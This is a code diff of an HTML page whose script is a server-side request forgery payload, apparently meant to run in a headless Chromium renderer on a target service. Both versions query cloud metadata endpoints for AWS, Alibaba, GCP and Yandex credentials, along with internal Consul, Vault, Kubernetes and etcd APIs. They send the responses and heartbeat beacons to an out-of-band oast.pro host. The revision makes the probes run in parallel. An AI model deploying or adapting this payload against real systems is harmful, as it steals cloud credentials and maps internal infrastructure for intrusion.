@@ -4,69 +4,56 @@
 <body>
 <script>
 var OOB = 'd9j2sgb6b8m92s73q8v0ixyk7io8j763i.oast.pro';
+var T0 = Date.now();
 
-function exfil(label, data) {
-  var d = encodeURIComponent(String(data).slice(0, 400));
-  var img = new Image();
-  img.src = 'https://' + OOB + '/' + label + '?d=' + d;
-  return fetch('https://' + OOB + '/' + label + '?d=' + d, {
-    mode: 'no-cors',
-    signal: AbortSignal.timeout(4000)
-  }).catch(function(){});
+function fire(path) {
+  new Image().src = 'https://' + OOB + path + '&_=' + Math.random();
+  fetch('https://' + OOB + path, {mode:'no-cors'}).catch(function(){});
 }
 
-function probe(label, url, headers) {
-  var t0 = performance.now();
-  return fetch(url, {
-    signal: AbortSignal.timeout(6000),
-    headers: headers || {}
-  }).then(function(r) {
-    return r.text().then(function(text) {
-      var ms = Math.round(performance.now() - t0);
-      return exfil('ok-' + label, ms + 'ms:' + r.status + ':' + text.slice(0, 300));
+// Heartbeat every 300ms - tells us how long Chromium keeps the page alive
+var hbN = 0;
+var hbTimer = setInterval(function() {
+  hbN++;
+  fire('/hb?n=' + hbN + '&ms=' + (Date.now() - T0));
+}, 300);
+setTimeout(function(){ clearInterval(hbTimer); }, 20000);
+
+// Alive beacon
+fire('/alive?ua=' + encodeURIComponent(navigator.userAgent.slice(0, 100)));
+
+// All IMDS probes fired in parallel, no await chain
+var probes = [
+  ['aws',     'http://169.254.169.254/latest/meta-data/iam/security-credentials/', {}],
+  ['aws-tok', 'http://169.254.169.254/latest/api/token', {method:'PUT', headers:{'X-aws-ec2-metadata-token-ttl-seconds':'21600'}}],
+  ['ali',     'http://100.100.100.200/latest/meta-data/', {}],
+  ['ali-cred','http://100.100.100.200/latest/meta-data/ram/security-credentials/', {}],
+  ['gcp',     'http://metadata.google.internal/computeMetadata/v1/project/project-id', {headers:{'Metadata-Flavor':'Google'}}],
+  ['gcp-sa',  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/', {headers:{'Metadata-Flavor':'Google'}}],
+  ['yc',      'http://169.254.169.254/latest/meta-data/', {headers:{'Metadata-Flavor':'Yandex'}}],
+  ['consul',  'http://127.0.0.1:8500/v1/catalog/services', {}],
+  ['vault',   'http://127.0.0.1:8200/v1/sys/health', {}],
+  ['k8s',     'https://kubernetes.default.svc/api/', {}],
+  ['etcd',    'http://127.0.0.1:2379/version', {}],
+];
+
+probes.forEach(function(p) {
+  var label = p[0], url = p[1], opts = p[2];
+  var t0 = Date.now();
+  var fetchOpts = {signal: AbortSignal.timeout(5000)};
+  if (opts.method) fetchOpts.method = opts.method;
+  if (opts.headers) fetchOpts.headers = opts.headers;
+
+  fetch(url, fetchOpts)
+    .then(function(r) {
+      return r.text().then(function(body) {
+        fire('/ok-' + label + '?ms=' + (Date.now()-t0) + '&s=' + r.status + '&d=' + encodeURIComponent(body.slice(0,300)));
+      });
+    })
+    .catch(function(e) {
+      fire('/err-' + label + '?ms=' + (Date.now()-t0) + '&e=' + encodeURIComponent(e.message.slice(0,100)));
     });
-  }).catch(function(e) {
-    var ms = Math.round(performance.now() - t0);
-    return exfil('err-' + label, ms + 'ms:' + e.message);
-  });
-}
-
-(async function() {
-  await exfil('alive', 'started-' + navigator.userAgent.slice(0, 80));
-
-  // AWS IMDS v1
-  await probe('aws1', 'http://169.254.169.254/latest/meta-data/');
-  // AWS IMDS v2 token
-  await fetch('http://169.254.169.254/latest/api/token', {
-    method: 'PUT',
-    headers: {'X-aws-ec2-metadata-token-ttl-seconds': '21600'},
-    signal: AbortSignal.timeout(5000)
-  }).then(function(r) {
-    return r.text().then(function(token) {
-      return probe('aws2-creds', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', {'X-aws-ec2-metadata-token': token});
-    });
-  }).catch(function(e) { return exfil('err-aws2-token', e.message); });
-
-  // Alibaba IMDS
-  await probe('ali', 'http://100.100.100.200/latest/meta-data/');
-  await probe('ali-creds', 'http://100.100.100.200/latest/meta-data/ram/security-credentials/');
-
-  // GCP
-  await probe('gcp-proj', 'http://metadata.google.internal/computeMetadata/v1/project/project-id', {'Metadata-Flavor': 'Google'});
-  await probe('gcp-sa', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/', {'Metadata-Flavor': 'Google'});
-  await probe('gcp-ip', 'http://169.254.169.254/computeMetadata/v1/project/project-id', {'Metadata-Flavor': 'Google'});
-
-  // internal services
-  await probe('consul', 'http://127.0.0.1:8500/v1/catalog/services');
-  await probe('vault', 'http://127.0.0.1:8200/v1/sys/health');
-  await probe('k8s', 'https://kubernetes.default.svc/api/v1/namespaces');
-  await probe('etcd', 'http://127.0.0.1:2379/version');
-
-  // Yandex Cloud (если ok.ru на YC)
-  await probe('yc', 'http://169.254.169.254/latest/meta-data/');
-
-  await exfil('done', 'all-probes-finished');
-})();
+});
 </script>
 </body>
 </html>
